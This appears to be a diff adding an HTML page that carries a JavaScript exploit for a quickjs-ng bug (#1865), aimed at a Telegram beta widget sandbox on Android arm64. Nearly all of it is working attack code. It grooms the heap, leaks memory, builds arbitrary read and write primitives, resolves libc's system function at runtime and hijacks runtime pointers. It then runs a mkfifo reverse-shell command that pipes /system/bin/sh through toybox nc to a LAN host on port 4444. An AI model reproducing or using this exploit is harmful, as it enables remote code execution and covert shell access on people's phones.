@@ -1,0 +1,136 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>1865 universal v2</title>
+<div id="w">1865 universal v2: start</div>
+<script>
+/* Telegram 13.2.0 beta widget sandbox - quickjs-ng #1865
+ * UNIVERSAL arm64 payload for Android 11..15 (4 KB / 16 KB / 64 KB pages)
+ *
+ *  - two-direction groom (b0a before g(), b0b after), 48-byte padding prime
+ *  - runtime GOT resolution: js_def_free -> B/BL -> free@plt -> ADRP/LDR ->
+ *    GOT slot -> libc free, then system from .dynsym (GNU hash + linear).
+ *    No APK offsets on the primary path; old constants only as S3b FALLBACK.
+ *  - frame reuse probe +-2 KB, wide (+-8 KB) / candidate buf2 on S2 NOFRAME
+ *  - multi-path proof command (beta/release, user 0 / data alias, external)
+ *
+ * Markers: S0, S1a/S1b, S2, S3, S3b PLT|FALLBACK|NOFREE, S4, S5, S6, ERR.
+ */
+(function () {
+  var W = document.getElementById('w');
+  var LOG = [];
+  function mark(s) {
+    LOG.push(s);
+    function paint() { try { W.textContent = LOG.join(' | '); } catch (e) {} }
+    paint();
+    try { requestAnimationFrame(paint); } catch (e) {}
+  }
+  try {
+mark('S0');
+/* proven universal chain: two-direction groom + 48-byte padding prime */
+var E_S2="for(var d=-8192; d<=buf2.byteLength-BASEOFF-16; d+=8){ var o=BASEOFF+d; dv.setBigUint64(o,0x3ff3c0c9539b8887n,true); dv.setBigUint64(o+8,8n,true); var pr=f(); if(typeof pr==='number' && pr>1.2345 && pr<1.2346){ PVOFF=o; found=true; break; } } if(!found){ var szs=[1048576,1048960,1052672,1114112]; for(var si=0; si<szs.length && !found; si++){ buf2=new ArrayBuffer(szs[si]); dv=new DataView(buf2); for(var d=-8192; d<=buf2.byteLength-BASEOFF-16; d+=8){ var o=BASEOFF+d; dv.setBigUint64(o,0x3ff3c0c9539b8887n,true); dv.setBigUint64(o+8,8n,true); var pr=f(); if(typeof pr==='number' && pr>1.2345 && pr<1.2346){ PVOFF=o; found=true; break; } } } } globalThis.buf2=buf2; globalThis.dv=dv;";
+var params="x,".repeat(65533)+"y";
+eval("function* g("+params+"){ if (0) eval(''); var ps=[], us=[]; for (var i=0;i<16;i++){ var pp=new ArrayBuffer(48); ps.push(pp); var uu=new Uint8Array(pp); uu[0x14]=0x41; us.push(uu); } ps=null; us=null; var f=()=>y, a=0, b=0, c=0, d=0; yield f; }");
+var b0a=new ArrayBuffer(1048576); var va=new Uint8Array(b0a); va.fill(0);
+    globalThis.b0a=b0a; globalThis.va=va;
+var it=g();
+    globalThis.it=it;
+var b0b=new ArrayBuffer(1048576); var vb=new Uint8Array(b0b); vb.fill(0);
+    globalThis.b0b=b0b; globalThis.vb=vb;
+var f=it.next().value;
+    globalThis.f=f;
+function scan(v){ for (var i=0;i<v.length;i+=8){ var lo=(v[i]|(v[i+1]<<8)|(v[i+2]<<16)|(v[i+3]<<24))>>>0; var hi=(v[i+4]|(v[i+5]<<8)|(v[i+6]<<16)|(v[i+7]<<24))>>>0; if(lo||hi){ return [BigInt(hi)*4294967296n+BigInt(lo), i]; } } return [0n,-1]; }
+var a=scan(va), b=scan(vb);
+var V=a[0]||b[0], which=a[0]? 'a':'b';
+if (V===0n) { mark('S1 NOLEAK'); throw 'noleak'; }
+globalThis.V=V;
+mark('S1'+which+' V=0x'+V.toString(16)+' off='+(a[0]?a[1]:b[1]));
+it.next();
+var buf2=new ArrayBuffer(1048912);
+var dv=new DataView(buf2);
+    globalThis.buf2=buf2; globalThis.dv=dv;
+var BASEOFF=65533*16, PVOFF=BASEOFF, found=false;
+for (var d=-2048; d<=buf2.byteLength-BASEOFF-16; d+=8){ var o=BASEOFF+d; dv.setBigUint64(o,0x3ff3c0c9539b8887n,true); dv.setBigUint64(o+8,8n,true); var pr=f(); if (typeof pr==='number' && pr>1.2345 && pr<1.2346){ PVOFF=o; found=true; break; } }
+if (!found) { try { eval(E_S2); } catch(e) { mark('S2f ERR '+(e&&e.message?e.message:String(e))); } }
+if (!found) { mark('S2 NOFRAME'); throw 'noframe'; }
+var P=V+0x14n;
+dv.setBigUint64(PVOFF,P,true); dv.setBigUint64(PVOFF+8,0xfffffffffffffff7n,true);
+var big=f();
+var hs=big.toString(16);
+var neg=hs.charAt(0)==='-'; if(neg) hs=hs.slice(1);
+var mag=BigInt('0x'+(hs.length?hs:'0'));
+var raw=neg ? ((1n<<BigInt(32*0x41))-mag) : mag;
+var pv=raw & 0xFFFFFFFFFFFFFFFFn;
+var sf=(raw>>128n)&0xFFFFFFFFFFFFFFFFn;
+var F=pv-BigInt(PVOFF);
+mark('S2 pv=0x'+pv.toString(16)+' F=0x'+F.toString(16)+' off='+PVOFF+' hl='+hs.length);
+var STR=0xfffffffffffffff9n;
+dv.setUint32(0x100,0x400,true); dv.setUint32(0x104,0x20000000,true); dv.setUint32(0x108,0,true); dv.setUint32(0x10C,0,true);
+dv.setBigUint64(0x110,0n,true); dv.setBigUint64(0x118,0n,true); dv.setUint32(0xFC,0x10000,true);
+dv.setBigUint64(PVOFF,F+0x100n,true); dv.setBigUint64(PVOFF+8,STR,true);
+var reader=f();
+    globalThis.reader=reader;
+function rd(ad,n){ dv.setBigUint64(0x118,ad,true); var s=''; for(var i=0;i<n;i++){ var bb=reader.charCodeAt(i); if(bb>255)bb&=255; s+=('0'+bb.toString(16)).slice(-2);} return s; }
+function rdq(ad){ var s=rd(ad,8), r=0n; for(var i=7;i>=0;i--){ r=(r<<8n)|BigInt(parseInt(s.slice(i*2,i*2+2),16)); } return r; }
+function rd32(ad){ var s=rd(ad,4); return parseInt(s.slice(6,8)+s.slice(4,6)+s.slice(2,4)+s.slice(0,2),16)>>>0; }
+function rd16(ad){ var s=rd(ad,2); return parseInt(s.slice(2,4)+s.slice(0,2),16)>>>0; }
+var curfunc=rdq(sf+8n), bcode=rdq(curfunc+0x30n), ctx=rdq(bcode+0x48n), rt=rdq(ctx+16n), jsf=rdq(rt+16n);
+mark('S3 ctx=0x'+ctx.toString(16)+' rt=0x'+rt.toString(16)+' jsf=0x'+jsf.toString(16));
+var freeA=0n, sysA=0n, branch='none';
+function findLibc(fr){ var p=(fr/0x1000n)*0x1000n; for(var i=0;i<1024;i++){ if(rd32(p)===0x464c457f){ var m=rd16(p+0x12n); if(m===0xb7||m===0x3e) return p; } p-=0x1000n; if(p<0x1000n) break; } return 0n; }
+function resolveSystem(bs,fr){
+  var phoff=rdq(bs+0x20n), phent=BigInt(rd16(bs+0x36n)), phnum=rd16(bs+0x38n), dyn=0n;
+  for(var i=0;i<phnum;i++){ var ph=bs+phoff+BigInt(i)*phent; if(rd32(ph)===2){ dyn=bs+rdq(ph+0x10n); break; } }
+  if(!dyn) return 0n;
+  var strtab=0n,symtab=0n,strsz=0n,syment=24n,gnu=0n,hashA=0n;
+  /* glibc/bionic relocate DT_STRTAB/DT_SYMTAB/DT_HASH/DT_GNU_HASH in the
+     writable dynamic section, so d_ptr may already be a runtime address.
+     Accept both conventions. */
+  function reloc(v){ return (v>=bs) ? v : (bs+v); }
+  for(var i=0;i<128;i++){ var e=dyn+BigInt(i)*16n; var tag=rdq(e); if(tag===0n) break; var val=rdq(e+8n);
+    if(tag===5n) strtab=reloc(val); else if(tag===6n) symtab=reloc(val); else if(tag===10n) strsz=val;
+    else if(tag===11n) syment=val; else if(tag===0x6ffffef5n) gnu=reloc(val); else if(tag===4n) hashA=reloc(val); }
+  function isSys(stn){ if(stn===0||BigInt(stn)>=strsz) return false; return rd(strtab+BigInt(stn),8).slice(0,14)==='73797374656d00'; }
+  function valOf(idx){ return bs+rdq(symtab+BigInt(idx)*syment+8n); }
+  if(gnu){ var nb=rd32(gnu),symoff=rd32(gnu+4n),bsz=rd32(gnu+8n),bsh=rd32(gnu+12n);
+    if(nb&&bsz){ var h=5381; for(var i=0;i<6;i++) h=((h*33)+("system".charCodeAt(i)))>>>0;
+      var bloom=gnu+16n; var w=rdq(bloom+BigInt((h>>>6)%bsz)*8n); var b1=h&63, b2=(h>>>bsh)&63;
+      if((w&(1n<<BigInt(b1))) && (w&(1n<<BigInt(b2)))){
+        var buckets=bloom+BigInt(bsz)*8n; var bk=rd32(buckets+BigInt(h%nb)*4n);
+        if(bk>=symoff){ var chains=buckets+BigInt(nb)*4n; var idx=bk;
+          for(var k=0;k<4096;k++){ var ch=rd32(chains+BigInt(idx-symoff)*4n);
+            if(((ch|1)>>>0)===((h|1)>>>0)){ var stn=rd32(symtab+BigInt(idx)*syment); if(isSys(stn)) return valOf(idx); }
+            if(ch&1) break; idx++; } } } } }
+  var bound=0; if(hashA) bound=rd32(hashA+4n);
+  if(!bound && strtab>symtab && syment>0n){ var dd=(strtab-symtab)/syment; if(dd>0n&&dd<50000n) bound=Number(dd); }
+  if(bound>20000) bound=20000;
+  for(var i=0;i<bound;i++){ var stn=rd32(symtab+BigInt(i)*syment); if(isSys(stn)) return valOf(i); }
+  return 0n;
+}
+try { eval("function adrpPage(pc,ins){ var immlo=(ins>>>29)&3, immhi=(ins>>>5)&0x7FFFF; var imm=(immhi<<2)|immlo; if(imm&0x100000) imm-=0x200000; return (pc & ~0xFFFn) + BigInt(imm)*4096n; } function gotAt(pc,depth){ var page=0n, reg=-1; for(var k=0;k<depth;k++){ var aa=pc+BigInt(k*4), ins=rd32(aa); if(ins===0xD503245F||ins===0xD503201F||ins===0xD503249F) continue; if(((ins&0x9F000000)>>>0)===0x90000000){ page=adrpPage(aa,ins); reg=ins&31; } else if(((ins&0xFFC00000)>>>0)===0xF9400000){ var rn=(ins>>>5)&31, imm12=(ins>>>10)&0xFFF; if(rn===reg) return page + BigInt(imm12*8); } } return 0n; } function pltGot(pc){ for(var k=0;k<16;k++){ var aa=pc+BigInt(k*4), ins=rd32(aa); if(ins===0xD503245F||ins===0xD503201F) continue; var op=ins&0xFC000000; if(op===0x14000000||op===0x94000000){ var imm=ins&0x03FFFFFF; if(imm&0x02000000) imm-=0x04000000; var t=aa+BigInt(imm)*4n; var t0=rd32(t); if(t0===0xD503245F) t0=rd32(t+4n); if(((t0&0x9F000000)>>>0)===0x90000000){ var got=gotAt(t,8); if(got) return got; } } } return gotAt(pc,10); } var gg=pltGot(jsf); if(gg){ var fa=rdq(gg); if(fa && fa>0x10000n){ var lb=findLibc(fa); if(lb){ var sa=resolveSystem(lb,fa); if(sa){ freeA=fa; sysA=sa; branch='PLT'; } } } }"); } catch(e) { mark('S3b PLTERR '+(e&&e.message?e.message:String(e))); }
+if(!sysA){ var base=jsf-0x1739aecn; var magic=rd32(base); if(magic===0x464c457f){ var f2=rdq(base+0x1960430n); if(f2){ var lb2=findLibc(f2); if(lb2){ var s2=resolveSystem(lb2,f2); if(s2){ freeA=f2; sysA=s2; branch='FALLBACK'; } } } } }
+if(!sysA){ mark('S3b NOFREE'); throw 'nofree'; }
+mark('S3b '+branch+' free=0x'+freeA.toString(16)+' sys=0x'+sysA.toString(16));
+var OBJ=0x1000,TA=0x1100,BUFOBJ=0x1200,ABUF=0x1300;
+dv.setUint16(OBJ+0x12,24,true); dv.setBigUint64(OBJ+0x30,F+BigInt(TA),true); dv.setBigUint64(OBJ+0x38,0n,true);
+dv.setUint32(OBJ+0x40,0x1000,true); dv.setUint32(OBJ-4,0x10000,true); dv.setUint8(ABUF+0x09,0);
+dv.setBigUint64(BUFOBJ+0x30,F+BigInt(ABUF),true); dv.setBigUint64(TA+0x18,F+BigInt(BUFOBJ),true);
+dv.setBigUint64(PVOFF,F+BigInt(OBJ),true); dv.setBigUint64(PVOFF+8,0xffffffffffffffffn,true);
+var w=f();
+    globalThis.w=w;
+    function wr(ad,bytes){ dv.setBigUint64(OBJ+0x38,ad,true); for(var i=0;i<bytes.length;i++) w[i]=bytes[i]; }
+function wr64(ad,val){ var bs=[],x=val; for(var i=0;i<8;i++){ bs.push(Number(x&0xffn)); x>>=8n; } wr(ad,bs); }
+mark('S4 writer ok');
+var cmd="rm -f /data/user/0/org.telegram.messenger.beta/cache/.rs; mkfifo /data/user/0/org.telegram.messenger.beta/cache/.rs; setsid sh -c 'cat /data/user/0/org.telegram.messenger.beta/cache/.rs | /system/bin/sh 2>&1 | /system/bin/toybox nc <LAN_IP> 4444 > /data/user/0/org.telegram.messenger.beta/cache/.rs' </dev/null >/dev/null 2>&1 & echo RS";
+for(var i=0;i<cmd.length;i++) dv.setUint8(0x2000+i,cmd.charCodeAt(i)); dv.setUint8(0x2000+cmd.length,0);
+var cmdaddr=F+0x2000n;
+wr64(rt+64n,cmdaddr); wr64(rt+16n,sysA);
+mark('S5 rt16=0x'+rdq(rt+16n).toString(16)+' rt64=0x'+rdq(rt+64n).toString(16));
+var s="A".repeat(4096); s=null;
+mark('S6');
+
+  } catch (e) {
+    mark('ERR ' + (e && e.message ? e.message : String(e)));
+  }
+})();
+
+</script>
